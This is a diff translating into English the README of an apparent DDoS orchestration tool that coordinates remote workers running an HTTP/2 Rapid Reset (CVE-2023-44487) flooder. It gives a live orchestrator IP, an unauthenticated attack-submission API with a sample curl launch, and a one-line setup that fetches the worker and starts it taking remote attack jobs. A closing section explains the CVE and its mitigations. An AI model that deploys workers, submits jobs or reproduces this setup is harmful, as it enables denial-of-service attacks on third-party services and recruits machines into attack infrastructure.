@@ -2,7 +2,7 @@
 
 # rapidreset-api
 
-**Orchestrator + remote workers untuk HTTP/2 Rapid Reset.**
+**Orchestrator + remote workers for HTTP/2 Rapid Reset.**
 
 ![node](https://img.shields.io/badge/node.js-v24-339933?logo=node.js&logoColor=white)
 ![javascript](https://img.shields.io/badge/javascript-ES2023-F7DF1E?logo=javascript&logoColor=black)
@@ -12,61 +12,61 @@
 
 `CVE-2023-44487` · `CWE-400` · CVSS `7.5` HIGH
 
-[Server aktif](#server-aktif) · [Setup client](#setup-client) · [Endpoint](#endpoint) · [CVE](#cve-2023-44487) · [Catatan](#catatan)
+[Live server](#live-server) · [Client setup](#client-setup) · [API](#api) · [CVE](#cve-2023-44487) · [Notes](#notes)
 
 </div>
 
 ---
 
-Satu proses kecil (`index.js`) membuka endpoint publik. Worker (`bot/client.js`) konek dari mesin mana pun, mengambil job, lalu menjalankan `rapidreset.js` secara lokal. Broker tidak pernah menjalankan proses sendiri — dia hanya memegang antrean dan memilih worker idle.
+A single small process (`index.js`) exposes one public endpoint. A worker (`bot/client.js`) connects from any machine, pulls a job, and runs `rapidreset.js` locally. The broker never spawns a process of its own — it only holds the queue and hands each job to an idle worker.
 
 ```
 client.js  ──HTTP upgrade──▶  index.js  ──job──▶  client.js  ──spawn──▶  rapidreset.js
-   worker                       broker                worker                flooder
+   worker                       broker               worker                flooder
 ```
 
-## Isi repo
+## Layout
 
-| Path | Fungsi |
+| Path | Purpose |
 | --- | --- |
-| `index.js` | broker + HTTP API + halaman dokumentasi di `/` |
-| `method.json` | daftar method dan template command `<<host>>` `<<time>>` `<<method>>` |
-| `bot/client.js` | worker, konek ke `index.js` lalu eksekusi command |
-| `bot/rapidreset.js` | flooder HTTP/2, CVE-2023-44487 |
-| `bot/proxi.txt` | daftar proxy, satu per baris |
+| `index.js` | broker, HTTP API, docs page at `/` |
+| `method.json` | method list with command templates `<<host>>` `<<time>>` `<<method>>` |
+| `bot/client.js` | worker, connects to `index.js` and runs the job command |
+| `bot/rapidreset.js` | HTTP/2 flooder, CVE-2023-44487 |
+| `bot/proxi.txt` | proxy list, one entry per line |
 
-## Server aktif
+## Live server
 
 ```
 http://204.10.194.164:3295
 ```
 
-| Halaman | URL |
+| Page | URL |
 | --- | --- |
-| Dokumentasi interaktif | http://204.10.194.164:3295/ |
-| Kirim job | http://204.10.194.164:3295/api/attack?host=&time=&method= |
-| Status worker | http://204.10.194.164:3295/api/workers |
+| Interactive docs | http://204.10.194.164:3295/ |
+| Submit a job | http://204.10.194.164:3295/api/attack?host=&time=&method= |
+| Worker status | http://204.10.194.164:3295/api/workers |
 
-## Setup server
+## Server setup
 
 ```bash
 git clone https://github.com/malasahjagotwin/rapidreset-api.git
 cd rapidreset-api
-npm install                # hanya butuh hpack
+npm install                # hpack only
 node index.js
 ```
 
-Variabel lingkungan:
+Environment variables:
 
-| Nama | Default | Keterangan |
+| Name | Default | Purpose |
 | --- | --- | --- |
-| `PORT` | `SERVER_PORT` lalu `3295` | port bind |
-| `HOST` | `0.0.0.0` | interface bind |
-| `CLIENT_TOKEN` | kosong | kalau diisi, worker wajib kirim header yang sama |
+| `PORT` | `SERVER_PORT`, then `3295` | listening port |
+| `HOST` | `0.0.0.0` | listening interface |
+| `CLIENT_TOKEN` | empty | when set, workers must send the same header |
 
-## Setup client
+## Client setup
 
-Satu baris. Download tiga file, install `hpack`, lalu start.
+One line. Downloads the three files, installs `hpack`, starts the worker.
 
 ```bash
 mkdir -p bot && cd bot \
@@ -77,29 +77,29 @@ mkdir -p bot && cd bot \
   && ORCHESTRATOR=http://204.10.194.164:3295 node client.js
 ```
 
-Dengan token:
+With a token:
 
 ```bash
-CLIENT_TOKEN=rahasia ORCHESTRATOR=http://204.10.194.164:3295 node client.js
+CLIENT_TOKEN=secret ORCHESTRATOR=http://204.10.194.164:3295 node client.js
 ```
 
-Worker tambahan cukup ulangi perintah yang sama. Beberapa job paralel per mesin:
+Repeat the same command on any other machine to add workers. Several parallel jobs per machine:
 
 ```bash
 MAX_CONCURRENT=2 ORCHESTRATOR=http://204.10.194.164:3295 node client.js
 ```
 
-## Endpoint
+## API
 
 ```
-GET /api/attack?host=<url>&time=<detik>&method=<nama>
+GET /api/attack?host=<url>&time=<seconds>&method=<name>
 ```
 
-| Parameter | Wajib | Keterangan |
+| Parameter | Required | Description |
 | --- | --- | --- |
-| `host` | ya | URL target, `http://` atau `https://`, tanpa spasi |
-| `time` | ya | durasi detik, `1`–`300` (alias lama: `itme`) |
-| `method` | ya | nama dari `method.json` |
+| `host` | yes | target URL, `http://` or `https://`, no whitespace |
+| `time` | yes | duration in seconds, `1`–`300` (legacy alias: `itme`) |
+| `method` | yes | a name from `method.json` |
 
 ```bash
 curl "http://204.10.194.164:3295/api/attack?host=https://example.com&time=30&method=rapidreset"
@@ -117,20 +117,20 @@ curl "http://204.10.194.164:3295/api/attack?host=https://example.com&time=30&met
 }
 ```
 
-Respons `202`, eksekusi di worker. Pantau lewat `statusUrl` selama `queued` atau `running`.
+Responds `202`, execution happens on the worker. Poll `statusUrl` while the job is `queued` or `running`.
 
-### Daftar endpoint
+### Endpoints
 
-| Endpoint | Metode | Fungsi |
+| Endpoint | Method | Purpose |
 | --- | --- | --- |
-| `/` | GET | halaman dokumentasi |
-| `/api/attack` | GET | kirim job |
-| `/api/attack/<id>` | GET | status job |
-| `/api/workers` | GET | daftar worker dan panjang antrean |
-| `/api/worker` | GET + Upgrade | kanal worker utama |
-| `/api/worker/signal` | POST | kanal cadangan kalau `Upgrade` diblokir proxy |
+| `/` | GET | docs page |
+| `/api/attack` | GET | submit a job |
+| `/api/attack/<id>` | GET | job status |
+| `/api/workers` | GET | connected workers and queue depth |
+| `/api/worker` | GET + Upgrade | primary worker channel |
+| `/api/worker/signal` | POST | fallback channel when `Upgrade` is blocked by a proxy |
 
-## Menambah method
+## Adding a method
 
 Edit `method.json`:
 
@@ -144,30 +144,30 @@ Edit `method.json`:
 ]
 ```
 
-Placeholder yang dikenali hanya `<<host>>`, `<<time>>`, dan `<<method>>`. Placeholder lain membuat request ditolak.
+Only `<<host>>`, `<<time>>`, and `<<method>>` are recognized. Any other placeholder makes the request fail.
 
 ## CVE-2023-44487
 
-HTTP/2 Rapid Reset. Publikasi 10 Oktober 2023, CVSS 7.5 HIGH, CWE-400 uncontrolled resource consumption. Memicu Google mencatat 398 juta rps dan Cloudflare 201 juta rps — DDoS terbesar yang pernah tercatat saat itu.
+HTTP/2 Rapid Reset, published 10 October 2023, CVSS 7.5 HIGH, CWE-400 uncontrolled resource consumption. It drove Google to record 398 million rps and Cloudflare 201 million rps — the largest DDoS seen at the time.
 
-Protokol HTTP/2 mengizinkan banyak stream dalam satu koneksi TCP/TLS. Setiap stream baru memaksa server mengalokasikan konteks: state parser HPACK, stream state machine, buffer, dan slot di `SETTINGS_MAX_CONCURRENT_STREAMS`.
+HTTP/2 allows many streams inside one TCP/TLS connection. Every new stream forces the server to allocate context: HPACK parser state, a stream state machine, buffers, and a slot under `SETTINGS_MAX_CONCURRENT_STREAMS`.
 
-Serangan memanfaatkan celah urutan itu. Klien membuka stream dengan `HEADERS` lalu segera mengirim `RST_STREAM`, membatalkan stream sebelum server selesai menyiapkan konteksnya. Pembatalan diproses lebih cepat daripada alokasi, sehingga batas stream konkuren tidak pernah tercapai. Server tetap membayar biaya kerja, lalu membuangnya. Loop itu diulang selama koneksi masih hidup, jadi satu koneksi bisa memicu puluhan ribu stream per detik.
+The attack exploits the ordering of that work. A client opens a stream with `HEADERS`, then immediately sends `RST_STREAM`, cancelling the stream before the server finishes allocating its context. Cancellation is processed faster than allocation, so the concurrent stream limit is never reached. The server still pays the work, then discards it. The loop repeats for as long as the connection lives, so a single connection can trigger tens of thousands of streams per second.
 
-Patch-nya bukan pada parser, tapi pada kebijakan stream: batasi `SETTINGS_MAX_CONCURRENT_STREAMS` secara agresif, jangan langsung buang state stream saat `RST_STREAM` datang, dan tambahkan kuota stream per koneksi. Go `net/http`, nginx, Apache httpd, Envoy, HAProxy, dan Node.js semuanya rilis perbaikan pada Oktober 2023.
+The fix is not in the parser but in stream policy: cap `SETTINGS_MAX_CONCURRENT_STREAMS` aggressively, do not free stream state the moment `RST_STREAM` arrives, and add a per-connection stream quota. Go `net/http`, nginx, Apache httpd, Envoy, HAProxy, and Node.js all shipped fixes in October 2023.
 
-| Field | Nilai |
+| Field | Value |
 | --- | --- |
 | CVE | `CVE-2023-44487` |
-| Nama | HTTP/2 Rapid Reset |
+| Name | HTTP/2 Rapid Reset |
 | CWE | `CWE-400` |
 | CVSS | `7.5` HIGH — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
-| Publikasi | 2023-10-10 |
-| Dampak | Denial of service |
-| Mitigasi | batas stream per koneksi, penanganan `RST_STREAM` |
+| Published | 2023-10-10 |
+| Impact | Denial of service |
+| Mitigation | per-connection stream limits, `RST_STREAM` handling |
 
-## Catatan
+## Notes
 
-- `/api/attack` tidak memakai autentikasi apa pun. Siapa pun yang bisa membuka URL-nya bisa mengirim job dan menjalankannya dari worker yang terhubung.
-- Worker yang putus di tengah job membuat job gagal setelah timeout 60 detik.
-- Antrean dibatasi 32 job menunggu, sisanya ditolak `503`.
+- `/api/attack` has no authentication. Anyone who can reach the URL can submit a job and have it executed by a connected worker.
+- A worker that disconnects mid-job fails that job after a 60 second timeout.
+- The queue holds 32 waiting jobs; the rest are rejected with `503`.
